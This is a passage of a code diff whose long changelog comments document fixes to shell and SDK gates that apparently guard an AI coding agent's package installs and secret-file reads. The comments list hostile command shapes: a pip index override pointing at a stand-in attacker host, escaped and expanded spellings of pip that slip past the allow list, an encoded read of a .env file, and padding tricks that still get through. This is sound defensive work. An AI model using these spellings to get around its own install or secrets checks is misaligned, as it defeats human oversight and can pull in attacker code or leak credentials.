@@ -1362,8 +1362,729 @@ EXPECTED_DIGESTS = {
     # one. Pinned by tests/test_hook_behavior.py "P0-3b(ii)", demonstrated to
     # fail (5 checks) against the pre-fix header.
     # [freeze-exception no. 35] dependency-gate.sh + sdk_gates/gates.py only.
+    #
+    # [freeze-exception no. 41, 2026-08-04] ATTACHED INDEX FLAGS: an
+    # SDK-more-permissive fail-open, i.e. the direction the parity contract
+    # forbids. The shell's index-override arm ends with the globs `-i?*|-f?*`
+    # so it denies the ATTACHED spelling; the SDK's _INDEX_FLAGS is an
+    # exact-match frozenset, so `-ihttp://evil/simple` matched no entry, fell
+    # through `if tok.startswith("-"): continue` as an ordinary flag and the
+    # line was ALLOWED. Measured at the v2.7.1 tag on a full install of both
+    # substrates: `pip install -ihttp://evil.test/simple requests`,
+    # `-fhttp://...`, `uv pip install -ihttp://...` and `python3 -m pip
+    # install -ihttp://...` were all shell=deny / sdk=allow. Not cosmetic: an
+    # index override redirects even an APPROVED package (`requests` IS on the
+    # approved list in every one of those rows) to an attacker's server.
+    # THE FIX, SDK-only: _is_attached_index_flag(tok) - `len(tok) > 2 and
+    # tok[:2] in ("-i", "-f")` - joins the `tok in _INDEX_FLAGS` arm, so the
+    # attached spelling denies with the SAME reason string the separated one
+    # emits (verified byte-equal against the shell's stderr). The length test
+    # IS the shell's `?`: a two-character token never matches, so BARE `-f`
+    # stays npm's --force and an ordinary value flag on both substrates - the
+    # deliberate `-f` exemption at sdk_gates_template.py is narrowed to the
+    # SEPARATED spelling only, not removed.
+    # THE SAME ARM'S OTHER GAP, found while measuring the controls for the
+    # above and closed in the same exception: `--default-index` and
+    # `--index-strategy` are in the shell's name list and were absent from the
+    # SDK's _INDEX_FLAGS. The URL spellings agreed only by ACCIDENT - the URL
+    # fell through to the package check and was refused as unapproved - so
+    # `pip install --default-index ./localwheels requests` and
+    # `--default-index /srv/wheels requests` were shell=deny / sdk=ALLOW at
+    # v2.7.1: unknown long flag skipped, local-path value skipped, approved
+    # package left over. It also retires a reason-string divergence -
+    # `--index-strategy unsafe-best-match` refused on the SDK with "not in
+    # deps.md approved list: unsafe-best-match", naming an index strategy as
+    # a package to approve, which is the advice F-1357 exists to prevent.
+    # QUALIFIED, BECAUSE "BETTER ADVICE" IS NOT THE SAME AS "ACCURATE ADVICE".
+    # The reason string this row hands `--index-strategy` says a package-index
+    # override "redirects even an APPROVED package to another server", and
+    # that is not what THAT flag does - it changes resolution ACROSS indexes
+    # already configured, it does not name a server. The sentence is accurate
+    # for the twelve other names in the same case arm and for the `*=*://*`,
+    # `-i?*` and `-f?*` value shapes; `--index-strategy` is the one member it
+    # over-claims about. Nothing REGRESSES: the SHELL has emitted exactly this
+    # string for that flag since before v2.7.1 (measured deny/deny on both
+    # trees), so the SDK is inheriting shell parity, and the string it
+    # replaces on the SDK named a resolution strategy as a package to approve,
+    # which is worse. But this row should not be read as having made the
+    # reason CORRECT for every name it now covers - it made it UNIFORM. Not
+    # softened here on purpose: the arm's thirteen names share one reason, so
+    # making it exact for `--index-strategy` means splitting a security-
+    # critical bash `case` arm (and its SDK twin) to add a fourteenth branch,
+    # which is a structural change to the emitted gates for a prose defect in
+    # one flag's advice. Recorded as a backlog row instead - see X-36m.
+    # VERIFIED PER-FILE BEFORE RE-BASELINING: counts stable at 57 / 69 / 59,
+    # 0 added, 0 removed, exactly ONE body moves per fixture -
+    # .claude/sdk_gates/gates.py. dependency-gate.sh is byte-identical, and so
+    # are the other 13 emitted hooks (the shell already denied every row; this
+    # is a pure SDK catch-up).
+    # >>> Same probe-vs-fixture count error as the one corrected in the FIRST
+    # >>> AMENDMENT below: 13 is the review probe install's hook count, not a
+    # >>> fixture's. The fixtures carry 11 / 15 / 11 hook `.sh`. The claim -
+    # >>> that this step moves gates.py only - is unaffected and holds. <<<
+    # ACCEPTANCE: 176 distinct commands x 2 substrates, a pristine install
+    # from the v2.7.1 TAG vs this tree in ONE process - 44 verdicts move sdk
+    # allow -> deny (the 4 reported rows, 38 attached siblings incl.
+    # pip3/sudo/uv/`-m pip`, trailing-flag position, `-i'quoted'`, `file://`,
+    # `-i./local`, `-f/tmp/wheels`, and the 2 `--default-index` rows), the
+    # PREVIOUSLY-DENIED-NOW-ALLOWED set is EMPTY, and the SHELL verdict moves
+    # on ZERO rows. Every one of the 44 was already shell=deny, so the split
+    # census goes 44 SDK-more-permissive rows -> 0 splits of either kind; no
+    # row where the shell ALLOWS moved on either substrate. That set includes
+    # `npm install -f`, `npm i -f`, `apt install -f`, `apt-get install -f`,
+    # `npm install -g -f`, `grep -ifoo x`, `sort -f`, `rm -f`, `git push -f`,
+    # `git clean -fd`, `tar -xzf`, `cp -if`, `ln -sf`, `ls -lif`, `df -i`,
+    # `docker build -fDockerfile.dev`, `docker compose -f`, `make -f`,
+    # `make install -fMakefile.prod`, `helm install rel ./chart -fvalues.yaml`,
+    # `kubectl apply -fdeploy.yaml`, `kubectl create -fmanifest.yaml`,
+    # `ansible-playbook -iinventory`, `gcc -Iinclude`, `cc -fPIC`, `sed -i.bak`,
+    # `ssh -i`, `rsync -iavz`, `curl -fsSL`, `wget -i`, `find . -iname` and
+    # `install -Dm755` - none of which is an install line the shell anchors.
+    #
+    # [freeze-exception no. 42, 2026-08-04] X-36h PART 1 - THE SPELLINGS A
+    # DECIDABLE EXPANSION PRODUCES. Six spellings of `pip` reached the install
+    # anchor unresolved while bash ran the installer, so `install evil` walked
+    # past the `deps.approved` ALLOW list on BOTH substrates. Confirmed under
+    # real bash 5.3 with a fake `pip` on PATH: `$'\x70ip'`, `$'\160ip'`,
+    # `p$'\151'p`, `pi${x:-p}`, `$(echo pip)` and `` `echo pip` `` all printed
+    # `install evil`.
+    #
+    # NO DENY ARM WAS ADDED, and that is the point. TWO were tried and
+    # reverted; the second, at 62de545, narrowed "a word carrying `$` or a
+    # backtick is unresolvable" by a TRAILING INSTALL_VERBS word, and it was
+    # re-applied and re-measured for this row at 15 of 46 ORDINARY commands
+    # newly refused (`$KUBECTL get pods` -> "approved list: pods",
+    # `sudo make -C $BUILD install DESTDIR=/tmp/stage` -> "DESTDIR"), because
+    # `install`/`i`/`add`/`get`/`require` are the ordinary verbs of kubectl,
+    # git, helm, make, brew, apt, cargo and terraform. Trailing context is not
+    # a discriminator.
+    #
+    # THE DISCRIMINATOR IS DECIDABILITY: is the word's value visible in the
+    # command TEXT? `cmdpos.resolved_spelling` decodes the NUMERIC ANSI-C
+    # escapes inside each `$'...'` run (re-emitting the run STILL QUOTED, so
+    # `git commit -m $'pip install evil'` stays ONE word rather than becoming
+    # the X-36k over-refusal) and substitutes the LITERAL branch of
+    # `${NAME:-WORD}` and its five siblings. A bare `$KUBECTL`/`${PIP}`
+    # produces NOTHING, so the 15 over-refusals are structurally impossible
+    # rather than merely unobserved. A decoded character is accepted only if
+    # it is printable ASCII 0x21-0x7e and not `'`, `"`, a backtick, `$` or a
+    # backslash - that exclusion set IS the safety argument, because the
+    # decode then cannot forge a quoting construct, an expansion, an escape or
+    # a second word. `command_spellings` returns a THIRD element and both
+    # allow-list gates already iterate it.
+    #
+    # WHY THE BLAST RADIUS IS EVERY HOOK: the bash transcription lives in
+    # `_HOOK_HEADER`, which every emitted hook carries. VERIFIED PER-FILE
+    # AGAINST A PRISTINE v2.7.1 INSTALL BEFORE RE-BASELINING: action counts
+    # stable at 57 / 69 / 59, 0 files added, 0 removed, and the moved set is
+    # EXACTLY the 11 / 15 / 11 hook bodies plus `.claude/sdk_gates/gates.py`
+    # in each fixture - no steering, skill, command, agent or settings body
+    # moves (37 hook bodies + 3 gates.py bodies, 0 added, 0 removed).
+    # WHICH NUMBER THAT IS, because two different 15s collide here and the
+    # review phase caught the conflation: every count in this entry is an
+    # ARTIFACT count - emitted files in a built install, counted per fixture -
+    # NOT a count of emission sites in the source. lib/templates.py has 15
+    # `return _HOOK_HEADER` SITES, but several are MODE VARIANTS of the same
+    # hook (one site per branch, one artifact per install), so the site count
+    # is not the blast radius of anything. The DEFAULT install emits 11 `.sh`
+    # hooks + gates.py = 12 ARTIFACTS, and that 12 is the number to quote for
+    # a plain header change. `full_autonomous` reaches 15 hook artifacts only
+    # because it additionally emits tdd-gate, eval-gate,
+    # drift-detector-loop-cooperation and iteration-summary-enforcement; its
+    # matching that site count is a COINCIDENCE, not a correspondence.
+    # dependency-gate.sh 2171 -> 2358 lines, secrets-gate.sh 1484 -> 1671,
+    # gates.py 2731 -> 2861. All 40 emitted `.sh` bodies across the three
+    # fixtures pass `bash -n`, and gates.py compiles under
+    # `-W error::SyntaxWarning`.
+    #
+    # ONLY-STRICTER, MEASURED RATHER THAN ASSERTED (the 2.7.1 note records
+    # that claim being made falsely once): a pristine v2.7.1 install vs this
+    # tree in ONE process, 862 distinct commands x 2 gates = 1724 evaluations,
+    # plus a 94-row focused table. `deny -> allow` on either substrate is
+    # EMPTY. `allow -> deny` is 18 on the sweep and 9 on the table, and every
+    # one is a command whose text says which program bash will run. SPLITS AT
+    # HEAD: 0, in EITHER direction.
+    # >>> FALSE AS WRITTEN, TWICE OVER, AND RE-MEASURED IN THE THIRD AMENDMENT
+    # >>> BELOW. There were 2 live splits on the escaped-backslash shape when
+    # >>> this was written (review 2 found them; the first amendment fixed
+    # >>> them), and there are 8 splits at head TODAY that this sentence
+    # >>> denies the existence of - none of them introduced by this row, ALL
+    # >>> of them present at v2.7.1. The sentence is a claim about a CORPUS
+    # >>> and it named none; the one it was actually read off - a v2.7.1-vs-
+    # >>> head DIFF - is one-directional by construction and cannot see a
+    # >>> split that both trees share. See the THIRD AMENDMENT. <<<
+    # Reason strings are byte-equal shell-vs-SDK
+    # on every moved row. The mechanism is monotone by construction - both
+    # consumers refuse if ANY spelling refuses - so an extra spelling can add
+    # a refusal and never remove one; the empirical run is the check on the
+    # wiring, not on the argument.
+    #
+    # A SECOND GATE MOVES, AND IT IS NOT THIS ROW'S: `cat $'\x2e\x65nv'` was
+    # allow/allow against the secrets gate at v2.7.1 - a live read of a
+    # protected path, the residue lib/cmdpos.py records under normalization
+    # step 5 - and is now deny/deny. The shell half is a SEPARATE `_sg_pass`
+    # line; wiring only the SDK leaves shell=allow / SDK=deny, the tolerated
+    # direction but a divergence that would have shipped silently. Both halves
+    # are wired and both are asserted. The new secrets denies are the
+    # PRE-EXISTING verdict on the literal spelling reached through a new
+    # spelling: `cat '.env'`, `echo '.env'`, `git commit -m '.env'` were
+    # already deny/deny at v2.7.1.
+    #
+    # PART 2 IS DELIBERATELY NOT IN THIS EXCEPTION. `$(echo pip)` and the
+    # backtick form need EXECUTION to resolve and stay allow/allow, pinned as
+    # such in both suites. They cannot be reached by any anchor arm today
+    # because `_cs_ops` splits on `(`, `)` and the backtick, so `install evil`
+    # lands in a headless segment; closing them is a segmenter change touching
+    # every gate that shares the header, or a marker-collapse spelling plus a
+    # substitution-only arm. That is an owner call and must not ride on part
+    # 1. Backlog X-36h moves from `open` to `partially fixed`.
+    #
+    # COST, and ONE THING THE FIRST CUT GOT WRONG. Ordinary command 0.0207 ->
+    # 0.0215 s/call (+4%); a command that actually carries `$'` +10%, a
+    # literal `${x:-...}` +16%.
+    # >>> THAT +16% IS A SMALL-COMMAND CONSTANT AND WAS READ AS A SCALING.
+    # >>> It is not one: the `${x:-...}` axis is ~2.9x and it CROSSES the
+    # >>> ceiling. See the no.-42 SECOND AMENDMENT below, which measures the
+    # >>> ladder, names the crossing, and fixes it. The paragraph is left
+    # >>> standing rather than rewritten because the mistake it records - one
+    # >>> measurement at one size, reported as if it were the curve - is the
+    # >>> same mistake as the `$'\400'` vector two amendments down. <<<
+    # The assignment-token ladder is unchanged:
+    # 1k 0.85 -> 0.86 s, 4k 14.06 -> 14.23 s, 8k 56.49 -> 55.81 s (0.99x),
+    # and a 150 KB heredoc 70.6 -> 82.8 s - all rc-identical, and the last two
+    # were already past the 60 s fail-CLOSED ceiling on both trees.
+    # >>> TRUE OF THOSE TWO PAYLOADS, BUT IT WAS NEVER A SEARCH. Nothing here
+    # >>> looked for the size at which a payload FIRST crosses; on the
+    # >>> `${x:-...}` axis it existed, at about 105 KB. <<<
+    # THE FIRST CUT OF THE BASH WALK CONSUMED ONE CHARACTER PER ITERATION,
+    # which is O(n^2) in bash's string slicing: a 10 KB PLAIN body inside
+    # `$'...'` - an ordinary long commit message or printf format, not an
+    # attack - went 0.39 s -> 7.17 s (18.6x), which walks a command that used
+    # to pass toward the ceiling and would have turned it into an
+    # unactionable timeout refusal. Both walks now consume a whole run at a
+    # time, and that payload is 1.0x. What remains is an ESCAPE-DENSE body
+    # (5000 `\xHH` escapes, 20 KB): 13.1 -> 23.4 s, 1.79x. That is not an
+    # ordinary command, it is already 13 s at v2.7.1, and it fails CLOSED.
+    # Recorded, not claimed closed.
+    #
+    # [freeze-exception no. 42, AMENDMENT - two adversarial reviews]
+    # THE FIRST CUT OF THE ANSI-C DECODER WAS WRONG IN BOTH DIRECTIONS, and
+    # the green suite could see neither. ONE MOVED BODY PER FIXTURE,
+    # `.claude/sdk_gates/gates.py`; all 13 emitted `.sh` hooks are BYTE-
+    # IDENTICAL to the first cut (verified per-file, both fixture shapes),
+    # because the shell transcription was right about both and only the two
+    # PYTHON copies moved. Action counts unchanged at 57 / 69 / 59.
+    # >>> "13 emitted `.sh` hooks" IS NOT A FIXTURE COUNT AND NO FIXTURE HAS
+    # >>> ONE. 13 is the hook count of the REVIEW PROBE install - the ad-hoc
+    # >>> config the two adversarial reviews built their dual-substrate
+    # >>> harness on, which turns tdd_policy on and so emits tdd-gate.sh and
+    # >>> eval-gate.sh on top of the 11 - and a digest re-baseline is a
+    # >>> statement about the GOLDEN FIXTURES, whose artifact counts are
+    # >>> 11 / 15 / 11 hook `.sh`, i.e. 12 / 16 / 12 artifacts once `gates.py`
+    # >>> is counted, and 37 hook bodies across the three. Quoting a probe
+    # >>> install's count in a fixture claim is the same class of error as the
+    # >>> emission-site conflation the entry above warns about at "WHICH
+    # >>> NUMBER THAT IS": a number that is real, but of the wrong thing. The
+    # >>> CLAIM ITSELF is true and is now
+    # >>> verified structurally rather than by a per-file dump of a tree that
+    # >>> no longer exists: perturbing the `& 0xFF` mask (both Python copies)
+    # >>> and perturbing `ANSIC_RE_SRC`'s catch-all each move 3 artifacts -
+    # >>> one `gates.py` per fixture - and 0 of the 37 hook bodies, while two
+    # >>> CONTROLS that the test can fail on (an edit to the shell's own
+    # >>> `_ansic_safe`, and an edit to `cmdpos.PARAM_DEFAULT_WINDOW`, which
+    # >>> IS rendered into the hook) move all 37. See the THIRD AMENDMENT. <<<
+    #
+    #   A. AN OCTAL ESCAPE IS A BYTE, NOT A CODE POINT. bash MASKS: `printf
+    #      '\560'` emits `0o560 & 0xFF` = `p`, and `$'\560ip' install evil`
+    #      really ran pip under bash 5.3 with a fake `pip` on PATH. The shell
+    #      arm inherits the mask from `printf` and was correct; the two Python
+    #      copies computed `chr(368)` and emitted NO spelling, so the SDK
+    #      ALLOWED what the shell DENIED on 89 of the 256 values in
+    #      `\400`-`\777`. That is the FORBIDDEN direction: the first cut
+    #      turned a SYMMETRIC fail-open into an ASYMMETRIC one, which is worse
+    #      than leaving X-36h open, because the parity contract is the thing
+    #      that was supposed to catch it. `ansic_char` now masks with `& 0xFF`
+    #      in both copies. ONE `$'\400'` vector had stood for the whole range
+    #      and could not: `0o400 & 0xFF` is NUL, the single value in the class
+    #      where all three implementations agree by accident - and the comment
+    #      on it said "overflows a byte", the WRONG MECHANISM, which is what
+    #      made one vector look like coverage of a 256-value range.
+    #
+    #   B. AN ESCAPED BACKSLASH IS NOT AN ESCAPE. `re.sub` retries ONE
+    #      character after a failed match, which lands INSIDE a `\\` pair, so
+    #      the reference and the SDK decoded the `x70` in `$'\\x70ip'` and
+    #      manufactured a spelling bash never produces (bash: `\x70ip:
+    #      command not found`). The shell walk consumes TWO characters, which
+    #      is what bash does. `ANSIC_RE_SRC` gained a `|(?s:.)` catch-all last
+    #      alternative so the regex consumes the whole escape as a unit;
+    #      `ansic_char` already returned `""` for a non-numeric body and the
+    #      `or m.group(0)` re-emits it unchanged. `(?s:.)` rather than `.`
+    #      because the shell arm's `?` matches a newline too - the scoped flag
+    #      closes that BY CONSTRUCTION, and a scoped group is non-capturing so
+    #      `m.group(1)` still names the body.
+    #
+    # MEASURED, NOT ASSERTED. 12,640 escape vectors - `\x00`-`\xff` in both
+    # digit counts, the whole `\0`-`\777` octal range in both, `\u`/`\U` over
+    # 0x0-0x17f plus the edges, and the non-numeric bodies - crossed with 7
+    # command shapes, driven through ALL THREE implementations (lib/cmdpos.py,
+    # the emitted gates.py, and the five functions extracted from the emitted
+    # dependency-gate.sh in a bare bash): 0 divergent. The SAME sweep against
+    # the first cut reports 644 divergent - 623 high-octal, every one of them
+    # SDK-blind where the shell decodes, plus 21 escaped-backslash - so the
+    # sweep is known to be able to fail. Verdict level, three trees in one
+    # process: `$'\560ip' install evil`, `$'\560\551p' install evil` and
+    # `p$'\551'p install evil` go (deny, ALLOW) -> (deny, deny), `cat
+    # $'\456env'` the same on the secrets gate, and `$'\\x70ip' install evil`
+    # / `$'\\160ip' install evil` go (allow, DENY) -> (allow, allow). Zero
+    # ordinary-command movement.
+    #
+    # COST OF THE CATCH-ALL, MEASURED ON THE AXIS IT ACTUALLY TOUCHES. Making
+    # every backslash match means the sub lambda now fires once per backslash
+    # instead of only on numeric escapes, so a BACKSLASH-DENSE 40 KB `$'...'`
+    # body goes 0.0015 -> 0.0087 s in the reference (5.9x on that one axis,
+    # and 8.7 MILLISECONDS in absolute terms). Escape-dense 40 KB is 1.00x,
+    # plain 40 KB 0.98x, an ordinary command unmeasurably small. THE SHELL
+    # SUBSTRATE - the slow one, and the one the 60 s fail-CLOSED ceiling
+    # actually binds - is BYTE-UNCHANGED by this fix, so no payload moves
+    # toward the ceiling. The `${x:-...}` scaling axis review 2 measured at
+    # ~2.9x is NOT this fix and is NOT closed here; it stays open.
+    #
+    # AND ONE CLAIM ABOVE IS CORRECTED. "SPLITS AT HEAD: 0, in EITHER
+    # direction" was false as first written: the escaped-backslash shape was
+    # two live splits, and the four pre-existing X-36g rows (`pip install
+    # requ\ests`) are also "at head". What is true, and what the sentence
+    # should have said, is that this row INTRODUCES no split in either
+    # direction - measured, not argued - and leaves the X-36g four exactly
+    # where v2.7.1 had them.
+    #
+    # [freeze-exception no. 42, SECOND AMENDMENT - review 2 finding 2]
+    # THE `${x:-...}` AXIS WAS NOT "+16%". IT IS ~2.9x, AND IT CROSSED THE
+    # 60 s FAIL-CLOSED CEILING: a command that PASSED at v2.7.1 became an
+    # unactionable timeout refusal. The number in the COST paragraph above is
+    # a SMALL-COMMAND CONSTANT reported where a SCALING belonged, and the
+    # sentence after it ("already past the ceiling on both trees") was true of
+    # the two payloads it measured and was never a SEARCH for the crossing.
+    #
+    #   n `${aN:-vN}`  bytes    v2.7.1   BEFORE   (b) only   AS SHIPPED
+    #      1000       13,779    0.47 s   1.21 s    0.64 s    0.64 s  1.37x
+    #      2000       29,779    1.71 s   5.03 s    2.20 s    1.71 s  1.00x
+    #      4000       61,779    6.56 s  20.67 s    8.21 s    6.63 s  1.01x
+    #      6000       93,779   14.68 s  44.90 s   18.00 s   14.65 s  1.00x
+    #      8000      125,779   26.17 s  86.34 s   31.84 s   25.97 s  0.99x
+    #                                   KILLED
+    # (BEFORE at 4000/6000/8000 is review 2's measurement of this same
+    # payload; 1000 and 2000 were re-measured here and reproduce it.)
+    #
+    # CAUSE, and it is not quite what "chunking" suggests. EVERY bash string
+    # operation costs O(length of the string it names), INCLUDING
+    # `case "$_rest" in ...`, because expanding `"$_rest"` into a word copies
+    # it. Measured on a 126 KB value: `p=$S` 1.6 ms, `case "$S" in *X*)`
+    # 1.7 ms whether it hits at offset 0 or never, `${S#*X}` 2.8 ms, `${S:2}`
+    # 2.9 ms, `${#S}` 0.06 ms. The whole-command walk paid four full-length
+    # operations per `${`, so it was O(n^2), and `_param_default` alone was
+    # 47.7 s of the 86.3 s at n=8000. There is no O(1) primitive on a large
+    # bash string to fix that with; the only fix is to stop naming the whole
+    # command.
+    #
+    # (b) THE WALK NOW RUNS OVER A BOUNDED WINDOW (1024 characters, from
+    # cmdpos.PARAM_DEFAULT_WINDOW, RENDERED into the hook rather than typed
+    # there), and `_out` is accumulated with `+=` instead of
+    # `_out="$_out$_word"` - 8000 appends, 2.06 s vs 0.03 s. `_param_default`
+    # at n=8000: 47.7 s -> 0.87 s. WHERE A WINDOW MAY END is the whole
+    # correctness argument and it is written out in the function: an accepted
+    # expansion holds only `[A-Za-z0-9._/+:@=-]` between its `${` and its `}`,
+    # so a cut after the last `}`, or before the last `${`, or anywhere in a
+    # `${`-free window (minus a trailing `$`) makes the whole-command walk and
+    # the windowed walk REJECT any straddler identically. Verified, not just
+    # argued: 144,573 inputs - RESOLVED_VECTORS, a corpus landing a token on
+    # every offset within +-12 of the boundary, `${`/`}`/`$`-dense repeats
+    # either side of it, and 5,900 structural fuzz cases - through all three
+    # implementations at windows 2, 3, 4, 5, 7, 8, 16, 32, 64 and the shipped
+    # 1024. ZERO DIVERGENT, with instrumented counters confirming all six cut
+    # arms fired rather than the corpus passing vacuously.
+    # cmdpos.PARAM_WINDOW_VECTORS carries 23 of those into the suite with
+    # expected values written out BY CONSTRUCTION, so it cross-checks the
+    # windowed walk against the regex instead of restating it.
+    #
+    # (b) ALONE DOES NOT MAKE THE PROPERTY TRUE, and this is the part that had
+    # to be measured rather than argued. What is left is a constant FACTOR
+    # (the "(b) only" column, 1.38x small and settling to 1.22x at the large
+    # end where the ceiling actually binds) on a SUPERLINEAR curve, and a
+    # constant factor on a superlinear curve still MOVES THE CROSSING. At the
+    # crossing: `${aN:-vN}` x 11000 (175,779 bytes) is 49.5 s at v2.7.1 - it
+    # PASSES - and 60.5 s windowed-but-unbudgeted, which the timeout KILLS.
+    # The ladder alone would not have found that; the crossing has to be
+    # searched for, which is exactly what the sentence being corrected here
+    # never did.
+    #
+    # (c) SO THE THIRD SPELLING HAS A LENGTH BUDGET,
+    # cmdpos.RESOLVED_SPELLING_MAX = 16384 characters, rendered into the shell
+    # hook and the SDK prelude from that one constant. Over it the spelling is
+    # not computed and the command gets its v2.7.1 verdict back, which is
+    # sound because `command_spellings` is MONOTONE - every consumer refuses
+    # if ANY spelling refuses - so an omitted spelling can remove a deny and
+    # never add one. "An oversized command is never SLOWER than v2.7.1" is
+    # then true BY CONSTRUCTION, not by a timing a slower machine invalidates.
+    # At n=12000, 3 runs each: v2.7.1 min 59.45 s, head min 59.54 s, 1.001x.
+    #
+    # WHY 16384: the budget is set from the WORST measured shape, not the
+    # average one - LADDER B, the escape-dense `$'\xHH'` axis, which is the
+    # 1.79x residue recorded above and which THIS ROW DOES NOT SPEED UP
+    # (`_ansic_body` is untouched; the budget is what stops it crossing):
+    #
+    #   n `\xHH`      bytes    v2.7.1   (b) only   AS SHIPPED
+    #      1000        4,017    0.58 s   1.02 s     1.01 s  1.73x
+    #      2000        8,017    2.13 s   3.74 s     3.69 s  1.73x
+    #      4000       16,017    8.05 s  14.57 s    14.54 s  1.81x  <- the edge
+    #      6000       24,017   18.53 s  32.61 s    18.27 s  0.99x  over budget
+    #      8000       32,017   32.71 s  57.74 s    32.45 s  0.99x  over budget
+    #
+    # The 4000 rung is 16,017 bytes - the last one under the budget, and the
+    # number the budget is chosen from. 14.5 s is a factor of four under the
+    # ceiling, so the guard's own edge keeps four-fold headroom for a slower
+    # machine. The 8000 rung was 57.7 s unbudgeted, ON the ceiling, which is
+    # why the budget is not 32768.
+    #
+    # A SHAPE NOBODY HAD MEASURED, found while sizing the budget: `${`
+    # REPEATED with no `}` at all. It takes the reject path once per `${`
+    # rather than once per token, so it is DENSER than the filed payload -
+    # 16 KB of it spent 5.25 s inside `_param_default`, extrapolating to ~74 s
+    # at 60 KB, WORSE than the payload review 2 filed. LADDER C, all three
+    # trees: 8 KB 0.19/0.35/0.34 s, 16 KB 0.61/0.91/0.91 s, 32 KB
+    # 2.24/2.82/2.22 s, 60 KB 7.41/8.57/7.38 s. Recorded because it is the
+    # reason this row did not stop at the axis the review named: the same
+    # ceiling was reachable by a shape the ladder did not contain, and a fix
+    # scoped to one measured payload would have left it.
+    #
+    # WHAT THE BUDGET COSTS, STATED RATHER THAN ARGUED AWAY: a command longer
+    # than 16 KB is not searched for an obfuscated install head, so
+    # `$'\x70ip' install evil` followed by 16 KB of padding is allowed -
+    # exactly as at v2.7.1, and exactly as `$(echo pip)` still is under part
+    # 2. Measured, at the boundary and in the right shape: padding AFTER the
+    # payload, because padding BEFORE it moves the word out of command
+    # position and is allow/allow on every tree, pinning nothing. At 16,384
+    # characters it is deny/deny; at 16,385 it is allow/allow, which is what
+    # v2.7.1 gave it.
+    #
+    # AND THE ONE PLACE THREE SUBSTRATES COULD DISAGREE ABOUT A NUMBER rather
+    # than a string: bash's `${#var}` and Python's `len` are two
+    # implementations of "how many characters is this". For any command that
+    # arrived through JSON they agree; where they could not - a lone
+    # surrogate, which bash sees as invalid bytes - bash counts MORE, so the
+    # shell skips and the SDK computes, i.e. shell allows / SDK denies, the
+    # TOLERATED direction. Driven at the boundary anyway, at +-1 character, in
+    # ASCII and in 2-, 3- and 4-byte characters, on all three.
+    # >>> THIS PARAGRAPH IS WRONG AND THE FOURTH AMENDMENT BELOW REPLACES IT.
+    # >>> `${#var}` and `len` are not two implementations of one question:
+    # >>> `${#var}` counts characters in a UTF-8 locale and BYTES under
+    # >>> LC_ALL=C, so the disagreement is not confined to a lone surrogate
+    # >>> and it is not confined to the tolerated direction by anything but
+    # >>> luck. The "driven at the boundary anyway" sweep ran in ONE locale -
+    # >>> the suite's inherited UTF-8 one - which is precisely why driving it
+    # >>> found nothing. The unit is now UTF-8 BYTES on all three, pinned
+    # >>> with `local LC_ALL=C` in the shell's `_blen`, and the sweep now
+    # >>> carries a locale dimension. <<<
+    #
+    # BLAST RADIUS OF THIS AMENDMENT, measured per fixture against a
+    # reconstruction of the pre-amendment tree (the reconstruction is checked,
+    # not trusted: it reproduces that tree's `git diff --stat` against v2.7.1
+    # exactly). 0 added, 0 removed, action counts stable at 57 / 69 / 59, and
+    # the moved set is EXACTLY the 11 / 15 / 11 hook bodies plus
+    # `.claude/sdk_gates/gates.py` - no steering, skill, command, agent or
+    # settings body. Unlike the FIRST amendment, the `.sh` hooks DO move here:
+    # that one changed only the two Python copies, this one changes the shell
+    # transcription, which every hook carries. Verdicts across the pre-tree
+    # and this one, 98 (command, gate) rows x 2 substrates on each of three
+    # trees: exactly 10 rows differ, every one a command OVER the budget,
+    # every one deny -> allow, and every one
+    # landing on the v2.7.1 verdict. Splits at head: 0.
+    # >>> Same defect as the one this amendment's own predecessor carries: a
+    # >>> "splits at head" figure read off a DIFF over the 98 rows THIS row
+    # >>> moved. See the THIRD AMENDMENT for the census; the number over a
+    # >>> stated corpus is 8, and this row introduces none of them. <<<
+    # Loosenings against
+    # v2.7.1: 0. Ordinary commands: 1.02x pre-tree over v2.7.1 and 1.02x this
+    # tree over the pre-tree, both inside the run-to-run spread of an 18-21 ms
+    # hook invocation; the `${x:-...}`-bearing ones (`make -j${JOBS:-4} all`)
+    # carry the part-1 constant on BOTH trees, so it is inherited, not added.
+    #
+    # [freeze-exception no. 42, THIRD AMENDMENT - making this entry's own
+    # recorded claims true, 2026-08-05]
+    #
+    # 1. "SPLITS AT HEAD: 0, IN EITHER DIRECTION" IS FALSE, AND THE WAY IT WAS
+    # FALSE IS THE POINT. It was written twice, by two different passes, and
+    # both times it was read off a v2.7.1-vs-head DIFF. A release diff is
+    # ONE-DIRECTIONAL BY CONSTRUCTION: it enumerates rows that MOVED. A split
+    # that both trees share does not move, so a diff cannot see it, and a
+    # census of splits is not a claim about a diff at all - it is a claim
+    # about a CORPUS, evaluated at ONE tree. The same KB rule already governs
+    # the sibling sentence in this entry ("previously-denied-now-allowed is
+    # EMPTY"): that one IS a diff claim and is stated correctly; this one is
+    # not, and was stated as if it were.
+    #
+    # THE CORPUS, NAMED, because a census with no corpus is not a measurement.
+    # 706 distinct (command, gate) rows - 643 on dependency-gate and 63 on
+    # secrets-gate - driven on BOTH substrates against a pristine install
+    # built from the v2.7.1 TAG and against this tree, in ONE process:
+    # 2,824 verdicts. It is review 2's corpus A plus two additions. From
+    # review 2: 130 real developer commands (git, npm, pip, docker, make,
+    # cmake, kubectl, helm, terraform, tar, grep, find, sed, cargo, go, apt,
+    # brew, curl, ssh, rsync, gcc), the X-36h shapes with their controls and
+    # over-refusal guards, the index-flag shapes with their bare-`-i`/`-f` and
+    # non-install-line controls, and the X-36a/b/f/g/i/k payloads lifted from
+    # their spec rows. Added here: the shapes the two reviews FOUND (high
+    # octal `$'\560ip'`, escaped-backslash `$'\\x70ip'`, `\c` / digit-less
+    # `\x`, and the length budget at 16 KB either side); and a SYSTEMATIC
+    # ENCODING SWEEP so the census covers the encoding space structurally
+    # rather than by example - each of the 18 INSTALL_TOOLS head spellings and
+    # 12 ordinary heads, encoded SEVEN ways (plain, `$'\xHH'`, `$'\NNN'`,
+    # high octal `$'\4NN'`, escaped-backslash `$'\\xHH'`, `${zz:-W}`, and
+    # first-character-only), and the four protected paths encoded the same
+    # seven ways against the secrets gate.
+    #
+    # WHAT IS ACTUALLY TRUE, MEASURED OVER THAT CORPUS:
+    #   * SPLITS AT HEAD: 8, not 0. FOUR in the forbidden direction (shell
+    #     denies, SDK allows) - and they are exactly the four pre-existing
+    #     X-36g rows the backlog already carries: `pip install requ\ests`,
+    #     `pip install requests\>=2.0`, `pip install \requests`,
+    #     `pip install requests\==2.0`. FOUR in the tolerated direction (shell
+    #     allows, SDK denies), which NO version of this sentence has ever
